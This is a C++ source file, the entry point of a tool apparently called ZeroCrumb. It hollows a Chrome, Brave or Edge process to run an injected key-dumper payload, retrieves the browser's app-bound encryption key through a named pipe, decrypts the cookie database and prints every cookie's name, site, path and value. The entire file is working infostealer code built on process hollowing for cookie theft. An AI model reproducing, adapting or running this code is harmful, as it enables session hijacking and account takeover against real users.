#include <iostream>
#include<windows.h>

#include "./src/comm/comm.h"
#include "./src/hollowing/hollowing.h"
#include "./src/config/config.h"
#include "./src/utils/utils.h"

#include "./src/decryptor/content/content.h"

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: ZeroCrumb.exe <BROWSER_TYPE>\n");
        return -1;
    }

    // chrome = 0, brave = 1, edge = 2
    DWORD browserType = atoi(argv[1]);

    BrowserPathConfig browserConfig;

    switch (browserType) {
    case BrowserType::Chrome:
        browserConfig = config::chrome;
        break;

    case BrowserType::Brave:
        browserConfig = config::brave;
        break;

    case BrowserType::Edge:
        browserConfig = config::edge;
        break;

    default:
        printf("[-] Invalid Browser Type.\n");
        return -1;
    }
    
    SIZE_T payloadSize;
    PBYTE payload = hollowing::getPayloadBuffer(config::keyDumperPath.c_str(), payloadSize);

    auto exePath = browserConfig.exePath;

    if (!hollowing::hollow(exePath.c_str(), payload, payloadSize)) {
        printf("[-] Failed To Spawn Hollowed Browser Instance.\n");
        return -1;
    }

    printf("[*] Reading ABK From ZeroCrumb Named Pipe...\n");

    Sleep(250);

    HANDLE pipe = comm::connectToPipe();
    PBYTE key = comm::readAppBoundKey(pipe);

    if (!key) {
        printf("[-] Failed To Read Key From Zero Crumb Named Pipe.\n");
        return -1;
    }

    decryptor::initSodium();

    auto cookiesPath = browserConfig.cookiesPath;
    auto reader = new CookieReader(cookiesPath.c_str(), key);

    reader->initSqliteDb();
    reader->prepare(queries::cookies);
    reader->populateCookies();
    
    for (auto& cookie : reader->cookies) {

        string name = cookie->name;
        string site = cookie->site;
        string path = cookie->path;
        string cookieValue = cookie->cookie;

        printf("============\nName: %s\nSite: %s\nPath: %s\nCookie: %s\n", name.c_str(), site.c_str(), path.c_str(), cookieValue.c_str());
    }

}
